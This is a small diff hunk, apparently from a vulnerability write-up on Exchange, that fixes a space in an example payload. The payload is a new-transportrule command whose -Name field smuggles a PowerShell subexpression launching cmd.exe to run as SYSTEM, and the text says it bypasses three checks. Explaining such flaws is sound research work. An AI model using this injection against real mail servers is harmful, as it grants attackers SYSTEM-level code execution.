@@ -196,7 +196,7 @@ The following payload can bypass all three checks as
 mentioned above:
 
 <![CDATA[ new-transportrule
-   -Name$([Diagnostics.Process]::start("cmd.exe / C <run-as-SYSTEM>"))
+   -Name $([Diagnostics.Process]::start("cmd.exe / C <run-as-SYSTEM>"))
    -DlpPolicy "%%DlpPolicyName%%"
 ]]>
 
